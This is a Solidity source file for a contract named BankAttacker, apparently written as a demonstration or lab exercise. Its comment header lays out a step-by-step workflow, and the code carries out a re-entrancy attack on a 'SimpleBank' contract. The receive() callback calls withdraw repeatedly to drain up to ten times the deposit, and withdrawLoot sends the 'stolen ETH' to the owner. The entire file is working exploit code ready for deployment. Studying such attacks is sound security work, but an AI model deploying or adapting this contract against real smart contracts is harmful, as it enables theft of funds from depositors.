// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

interface ISimpleBank {
    function deposit(address _to) external payable;
    function withdraw(address _to) external;
}

/**
 * @title BankAttacker
 * @notice Demonstrates a re-entrancy attack against SimpleBank.
 *
 * Workflow:
 *   1. deploy SimpleBank
 *   2. fund SimpleBank (e.g., 1 ETH) from any address
 *   3. deploy BankAttacker with bank address
 *   4. call depositToBank() with exactly STEP (0.1 ETH by default)
 *   5. call exploit() — drains up to MAX_LOOPS × STEP from the bank
 *   6. call withdrawLoot() to pull stolen ETH to your EO-A
 */
contract BankAttacker {
    ISimpleBank public immutable bank;
    address payable public immutable owner;

    uint256 private constant STEP       = 0.1 ether; // per-loop withdrawal
    uint8   private constant MAX_LOOPS  = 10;        // safety cap
    uint8   private loops;                           // loop counter
    bool    private seeded;                          // deposit done?

    constructor(address _bank) {
        bank  = ISimpleBank(_bank);
        owner = msg.sender;
    }

    /* Deposit STEP (or more) into the bank for *this* contract */
    function depositToBank() external payable {
        require(msg.sender == owner, "Only owner");
        require(!seeded,              "Already seeded");
        require(msg.value >= STEP,    "Need >= STEP");
        bank.deposit{value: msg.value}(address(this));
        seeded = true;
    }

    /* Kick-off: performs first withdraw, which triggers receive() */
    function exploit() external {
        require(msg.sender == owner, "Only owner");
        require(seeded,             "Seed first");
        bank.withdraw(address(this));
    }

    /* Called back by the bank’s unsafe transfer */
    receive() external payable {
        if (loops < MAX_LOOPS && address(bank).balance >= STEP) {
            loops++;
            bank.withdraw(address(this)); // re-enter
        }
    }

    /* Collect the stolen ETH */
    function withdrawLoot() external {
        require(msg.sender == owner, "Only owner");
        owner.transfer(address(this).balance);
    }
}
